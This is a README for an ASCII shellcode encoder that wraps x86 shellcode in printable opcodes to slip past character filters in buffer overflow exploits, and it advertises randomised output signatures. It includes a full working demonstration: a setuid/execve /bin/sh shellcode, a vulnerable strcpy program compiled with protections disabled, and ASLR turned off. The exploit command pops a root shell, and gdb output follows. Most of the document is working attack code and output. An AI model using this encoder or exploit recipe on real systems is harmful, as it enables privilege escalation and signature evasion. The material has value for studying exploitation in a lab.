# PolyAsciiShellGen: alphanumeric shellcode encoder

PolyAsciiShellGen is a simple alphanumeric shellcode encoder coded in C. This program automates the [Riley Eller's technic](http://julianor.tripod.com/bc/bypass-msb.txt) to bypass MSB data filters, for buffer overflow exploits, on Intel platforms. It provides extra functionnalities such as the NOP sleed generation and the size optimisation. It takes a shellcode to encode in entry and return a printable shellcode directly useable. 



## Synopsis

Getting and building the PolyAsciiShellGen program.

``` 
$ git clone https://github.com/VincentDary/PolyAsciiShellGen.git
$ cd PolyAsciiShellGen
$ make && make clean
```
Usage.

```
$ ./PolyAsciiShellGen
usage: PolyAsciiShellGen <esp offset> <nop sleed factor N * 4 NOPS> <shellcode "\xOP\xOP"...>
```

## Description

 PolyAsciiShellGen takes a shellcode in entry, it encodes the shellcode in ASCII format, and then it builds a decoder/loader with printable opcodes which wraps the encoded shellcode. This program automates and optimizes the shellcode encoding process in ASCII format describe by Riley Eller in this [paper](http://julianor.tripod.com/bc/bypass-msb.txt). Moreover, this article shows how to build a machine code which decodes and loads a encoded shellcode with a reduce set of x86 printable opcodes. The resulting machine code in printable format, realises the following operations to load, and to execute the original shellcode in the memory:


 "*move the stack pointer just past the ASCII code, decode 32-bits of the original sequence at a time, and push that value onto the stack. As the decoding progresses, the original binary series is "grown" toward the end of the ASCII code. When the ASCII code executes its last PUSH instruction, the first bytes of the exploit code are put into place at the next memory address for the processor to execute.* "


Riley Eller


Below, an illustration of the shellcode loading techique realized by the shellcode loader.

``` 
 1)      Low addresse      2)      Low addresse     3)      Low addresse
      |                |        |                |       |                |
eip-->|----------------|        |----------------|       |----------------|
      |                |        |                |       |                |
      |    Shellcode   |        |    Shellcode   |       |    Shellcode   |
      |     loader     |        |     loader     |       |     loader     |
      |                |  eip-->|                |       |                |
      |                |        |                |       |                |
      |                |        |                |  eip  |                |
      |----------------|        |----------------|    -->|----------------|
      |                |        |                |  esp  |                |    
      |                |        |                |       |                |    
      |                |        |                |       |                |
      |                |  esp-->|----------------|       |     Builded    |
      |                |        |                |       |    Shellcode   |
      |                |        |     decoded    |       |                |
      |                |        |    shellcode   |       |                |
esp-->|                |        |                |       |                |
      |                |        |----------------|       |----------------|
         High adresse              High adresse             High adresse

```

PolyAsciiShellGen provides extra functionnalities in addition of automates the Riley Eller’s technique. It allows to add an extra NOP sleed between the shellcode loader and the decoded shellcode in order to reliable the exploit. Moreover, it optimises the shellcode encoding process in order to return an ASCII shellcode as small as possible.

## Options and return value

- **_esp offset_**

The esp offset parameter allows to adjust the position of the stack pointer from its original position, when the loader code is executed. This value can be very useful to add an extra NOP sleed between the shellcode loader and the builded shellcode. This paramater can be a positive or a negative value.


- **_sleed factor_**

The NOP sleed factor parameter allows to add a nop sleed bridge between the shellcode loadder and the builded shellcode. This parameter is an integer which allows to add nop instructions by group of four bytes. This nop sleed must be used to reliable the exploit, not to set the shellcode padding.


- **_shellcode_**

The shellcode parameters is the shellcode in escaping format "...\xcd\x80...". If the lenght of the shellcode in entry is not a multiplier of four bytes, it is padded with extra nop byte.


- Return value

The return value of this command is the printable encoded shellcode. The resulting printable encoded shellcode is generated randomly between each execution. So, you can generate a set of printable encoded shellcode with different signatures from one original shellcode. The ASCII characteres set use for the encoding is the following:
"%_01234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-". 


## Example

Use example with a setuid(0) and execve(/bin//sh,0,0) shellcode.

```
$ ./PolyAsciiShellGen -270 10 "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\xa4\xcd\x80\x31\xc0\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xcd\x80"
TX-KKKK-KKKK-xjiiP\%0000%AAAA-9%%%-GJJJP-hhNh-th3%-Q6-5P-yyyZ-yZy6-L6---2-8-P-7KKd-%Kdz-%RkzP-xxxx-GGGx-0AFiP-OOOO-jOwO-iaraP-NN%N-a%%a-q44tP-%SS0-%SL5-7uC%P-FkFF-9pUhP-XXXX-XXXX-PXOFP-AAAj-0w2j-0w-vPPPPPPPPPP
```

These parameters specifies to substract 270 bytes to esp and add 40 bytes of nop sleed bridge. To test the encoded shellcode, take for example this famous code, vulnerable to a stack based overflow.

```
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

int foo(char *str){
    char buffer[512];
    printf("[buffer addr] 0x%x: %s\n\n", &buffer, str);
    strcpy(buffer, str);
    return 0;
}

int main(int argc, char *argv[]){
    if(argc != 2)
        exit(0);
    foo(argv[1]);
}
```

Build this code without security memory protections against malicious code execution on the stack (DEP):

```
$ gcc -fno-pie -fno-stack-protector -z execstack -m32 -g vuln.c -o vuln
```

Set the executable with the with the setuid bit and the root owner, for use all the shellcode’s functionalities:

```
# chown root:users vuln
# chmod u+s vuln 
# ls -l vuln
-rwsr-xr-x 1 root users 7068 Jul  6 02:37 vuln
```

Set the ASLR to off in order to use a predictable address to redirect the execution path to the injected shellcode.

```
# echo 0 > /proc/sys/kernel/randomize_va_space
```

Inject the encoded shellcode on the vulnerable buffer and write the return address with the predictable buffer address.

```
$ ./vuln "TX-KKKK-KKKK-xjiiP\%0000%AAAA-9%%%-GJJJP-hhNh-th3%-Q6-5P-yyyZ-yZy6-L6---2-8-P-7KKd-%Kdz-%RkzP-xxxx-GGGx-0AFiP-OOOO-jOwO-iaraP-NN%N-a%%a-q44tP-%SS0-%SL5-7uC%P-FkFF-9pUhP-XXXX-XXXX-PXOFP-AAAj-0w2j-0w-vPPPPPPPPPP$(perl -e 'print "\xd0\xd6\xff\xff"x80')"

[buffer addr] 0xffffd6d0: 
TX-KKKK-KKKK-xjiiP\%0000%AAAA-9%%%-GJJJP-hhNh-th3%-Q6-5P-yyyZ-yZy6-L6---2-8-P-7KKd-%Kdz-%RkzP-xxxx-GGGx-0AFiP-OOOO-jOwO-iaraP-NN%N-a%%a-q44tP-%SS0-%SL5-7uC%P-FkFF-9pUhP-XXXX-XXXX-PXOFP-AAAj-0w2j-0w-vPPPPPPPPPP��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
sh-4.3# whoami
root
```

## Debugging

Bellow, the encoded shellcode loaded in the vulnerable buffer and its disassembly listing.

```
$ gdb -q vuln
(gdb) l
32      char buffer[512];
33  
34      printf("[buffer addr] 0x%x %s\n", &buffer, str);
35  
36      strcpy(buffer, str);
37  
38      return 0;
39  }
40  
41  
(gdb) b 38
Breakpoint 1 at 0x8048493: file vuln.c, line 38.
(gdb)  r "TX-KKKK-KKKK-xjiiP\%0000%AAAA-9%%%-GJJJP-hhNh-th3%-Q6-5P-yyyZ-yZy6-L6---2-8-P-7KKd-%Kdz-%RkzP-xxxx-GGGx-0AFiP-OOOO-jOwO-iaraP-NN%N-a%%a-q44tP-%SS0-%SL5-7uC%P-FkFF-9pUhP-XXXX-XXXX-PXOFP-AAAj-0w2j-0w-vPPPPPPPPP$(perl -e 'print "\x70\xd6\xff\xff"x80')"

...

Breakpoint 1, foo (str=0xffffda00 "") at vuln.c:38
38      return 0;
(gdb) p &buffer
$1 = (char (*)[512]) 0xffffd670
(gdb) nexti
0x08048499  39  }
(gdb) nexti
0xffffd670 in ?? ()
(gdb) p $esp - $eip
$3 = 528
(gdb) x/61i $eip
=> 0xffffd670:  push   esp
   0xffffd671:  pop    eax
   0xffffd672:  sub    eax,0x4b4b4b4b
   0xffffd677:  sub    eax,0x4b4b4b4b
   0xffffd67c:  sub    eax,0x69696a78
   0xffffd681:  push   eax
   0xffffd682:  pop    esp
   0xffffd683:  and    eax,0x30303030
   0xffffd688:  and    eax,0x41414141
   0xffffd68d:  sub    eax,0x25252539
   0xffffd692:  sub    eax,0x4a4a4a47
   0xffffd697:  push   eax
   0xffffd698:  sub    eax,0x684e6868
   0xffffd69d:  sub    eax,0x25336874
   0xffffd6a2:  sub    eax,0x352d3651
   0xffffd6a7:  push   eax
   0xffffd6a8:  sub    eax,0x5a797979
   0xffffd6ad:  sub    eax,0x36795a79
   0xffffd6b2:  sub    eax,0x2d2d364c
   0xffffd6b7:  sub    eax,0x2d382d32
   0xffffd6bc:  push   eax
   0xffffd6bd:  sub    eax,0x644b4b37
   0xffffd6c2:  sub    eax,0x7a644b25
   0xffffd6c7:  sub    eax,0x7a6b5225
   0xffffd6cc:  push   eax
   0xffffd6cd:  sub    eax,0x78787878
   0xffffd6d2:  sub    eax,0x78474747
   0xffffd6d7:  sub    eax,0x69464130
   0xffffd6dc:  push   eax
   0xffffd6dd:  sub    eax,0x4f4f4f4f
   0xffffd6e2:  sub    eax,0x4f774f6a
   0xffffd6e7:  sub    eax,0x61726169
   0xffffd6ec:  push   eax
   0xffffd6ed:  sub    eax,0x4e254e4e
   0xffffd6f2:  sub    eax,0x61252561
   0xffffd6f7:  sub    eax,0x74343471
   0xffffd6fc:  push   eax
   0xffffd6fd:  sub    eax,0x30535325
   0xffffd702:  sub    eax,0x354c5325
   0xffffd707:  sub    eax,0x25437537
   0xffffd70c:  push   eax
   0xffffd70d:  sub    eax,0x46466b46
   0xffffd712:  sub    eax,0x68557039
   0xffffd717:  push   eax
   0xffffd718:  sub    eax,0x58585858
   0xffffd71d:  sub    eax,0x58585858
   0xffffd722:  sub    eax,0x464f5850
   0xffffd727:  push   eax
   0xffffd728:  sub    eax,0x6a414141
   0xffffd72d:  sub    eax,0x6a327730
   0xffffd732:  sub    eax,0x762d7730
   0xffffd737:  push   eax
   0xffffd738:  push   eax
   0xffffd739:  push   eax
   0xffffd73a:  push   eax
   0xffffd73b:  push   eax
   0xffffd73c:  push   eax
   0xffffd73d:  push   eax
   0xffffd73e:  push   eax
   0xffffd73f:  push   eax
   0xffffd740:  push   eax
(gdb)
```

Have fun !!

## Links

- [1] Bypassing MSB Data Filters for Buffer Overflow Exploits on Intel Platforms, Riley Eller “caezar”: 
[http://julianor.tripod.com/bc/bypass-msb.txt](http://julianor.tripod.com/bc/bypass-msb.txt)




